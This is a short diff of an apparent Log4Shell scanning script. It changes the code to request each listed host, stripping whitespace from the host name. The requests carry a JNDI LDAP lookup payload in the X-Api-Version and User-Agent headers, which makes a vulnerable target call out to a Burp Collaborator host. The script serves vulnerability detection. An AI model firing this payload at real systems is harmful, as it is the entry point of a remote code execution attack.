@@ -22,14 +22,14 @@ if __name__ == "__main__":
             header = {"X-Api-Version": "${jndi:ldap://" + args.colab + "/a}", "User-Agent":"${jndi:ldap://" + args.colab + "/a}"}
 
             try:
-                r = requests.get(args.url, headers=header)
+                r = requests.get(host.strip(), headers=header)
             except:
                 pass
             if 'Server' in r.headers:
                 if 'IIS' in r.headers['Server']:
-                    print(host + ' appears to be running IIS, should be fine - though feel free to double check collaborator')
+                    print(host.strip() + ' appears to be running IIS, should be fine - though feel free to double check collaborator')
             
-            print("request header sent for " + host + " check burp collaborator for DNS requests")
+            print("request header sent for " + host.strip() + " check burp collaborator for DNS requests")
     else:
         print("Testing: " + args.url + " can take a bit of time")
         header = {"X-Api-Version": "${jndi:ldap://" + args.colab + "/a}"}
